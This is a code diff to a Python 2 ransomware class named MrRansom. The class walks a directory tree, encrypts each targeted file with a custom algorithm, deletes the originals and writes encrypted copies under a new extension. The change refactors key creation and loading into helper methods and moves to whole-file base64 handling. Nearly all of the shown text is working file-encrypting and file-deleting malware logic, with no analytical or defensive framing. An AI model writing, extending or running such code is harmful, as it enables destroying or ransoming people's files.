@@ -4,7 +4,7 @@ import time
 import sys
 import locksmith
 
-from file_util import read_chunks, get_file, write_chunk
+from file_util import read_chunks, get_file, write_chunk, put_file, get_file_bytes, get_file_bytes_e64, put_file_d64
 from aldersonalgorithm import AldersonAlgorithm
 
 ENCRYPT = 'encrypt'
@@ -55,40 +55,41 @@ class MrRansom:
                           os.walk(root_dir) for file_name in file_names]
 
     def encrypt(self):
-        key = locksmith.create_key()
-
-        locksmith.export_key_file(self.root_dir, key)
+        key = self.make_key()
 
         for file_path in get_target_files(self.all_files, ENCRYPT):
-            out_file_path = file_path + ENCRYPTED_EXTENSION
+            content = get_file_bytes_e64(file_path)
+            os.remove(file_path)
 
-            self.process(file_path, out_file_path, AldersonAlgorithm(key).encrypt_chunk)
+            encrypted = AldersonAlgorithm(key).encrypt(content)
+
+            put_file(file_path + ENCRYPTED_EXTENSION, encrypted)
 
     def decrypt(self):
+        key = self.get_key()
+
+        for file_path in get_target_files(self.all_files, DECRYPT):
+            content = get_file(file_path)
+            os.remove(file_path)
+
+            decrypted = AldersonAlgorithm(key).decrypt(content)
+
+            put_file_d64(file_path[:len(file_path) - len(ENCRYPTED_EXTENSION)], decrypted)
+
+    def make_key(self):
+        key = locksmith.create_key()
+        try:
+            locksmith.export_key_file(self.root_dir, key)
+        except Exception as e:
+            print >> sys.stderr, e.message
+            exit(-1)
+        return key
+
+    def get_key(self):
+        key = None
         try:
             key = locksmith.get_key_file(self.root_dir)
         except Exception as e:
             print >> sys.stderr, e.message
             exit(-1)
-
-        for file_path in get_target_files(self.all_files, DECRYPT):
-            out_file_path = file_path[:len(file_path) - len(ENCRYPTED_EXTENSION)]
-
-            self.process(file_path, out_file_path, AldersonAlgorithm(key).decrypt_chunk)
-
-    @staticmethod
-    def process(in_file_path, out_file_path, process):
-        start_time = time.time()
-
-        in_file = open(in_file_path, "rb")
-        out_file = open(out_file_path, "w")
-
-        for chunk in read_chunks(in_file):
-            write_chunk(out_file, process(chunk))
-
-        in_file.close()
-        out_file.close()
-
-        os.remove(in_file_path)
-
-        print "Took {}s processing '{}'".format(time.time() - start_time, in_file_path)
+        return key
